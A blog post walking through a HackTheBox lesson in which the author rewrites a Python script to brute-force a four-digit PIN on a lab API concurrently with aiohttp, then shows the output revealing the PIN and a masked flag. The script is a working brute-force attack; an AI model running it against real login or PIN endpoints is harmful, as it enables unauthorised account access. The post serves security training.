---
title: 'HTB - Login Brute Forcing Module - Lesson  '
date: '2025-12-11T16:01:00+00:00'
author: Ryan
layout: post
draft: false
categories:
    - penetration-testing
    - infosec
    - hackthebox

---

# HackTheBox Login Brute Force

This is part of a multi-part series documenting my process for completing the HackTheBox modules. This first post covers capturing a flag from a web API by brute-forcing a 4-digit PIN.

This is a simple challenge (not even really a challenge, tbh), but it's a good warm-up for more complex brute-force tasks later on.

## Overview

HTB provides a public API and python script for this lesson. The script essentially just tries to authenticate to the API using a simple API key. The provided script is extremely slow and runs synchronously, so I rewrote it to be asynchronous using `aiohttp` to speed up the process.

```python
import asyncio
import aiohttp

IP = "94.237.120.74"
PORT = 58014

async def try_pin(session, pin):
    formatted_pin = f"{pin:04d}"
    url = f"http://{IP}:{PORT}/pin?pin={formatted_pin}"

    async with session.get(url) as resp:
        if resp.status == 200:
            data = await resp.json()
            if "flag" in data:
                return formatted_pin, data["flag"]
        else:
            print(f"Attempted PIN {formatted_pin}, received status {resp.status}")
    return None


async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [try_pin(session, pin) for pin in range(10000)]

        for coro in asyncio.as_completed(tasks):
            res = await coro
            if res:
                pin, flag = res
                print("Correct PIN:", pin)
                print("Flag:", flag)
                return


if __name__ == "__main__":
    asyncio.run(main())
```

Simple.

I setup a python environment using `uv` and installed libraries. This is really my only deviation from the provided instructions.

Run the script, and wait a few seconds.

```sh
....
Attempted PIN 2804, received status 401
Attempted PIN 1363, received status 401
Attempted PIN 2803, received status 401
Attempted PIN 8323, received status 401
Attempted PIN 8324, received status 401
Attempted PIN 4544, received status 401
Attempted PIN 2805, received status 401
Correct PIN: 1364
Flag: HTB{Bru******************}
```

Paste the flag in the text box on HTB and complete the challenge!
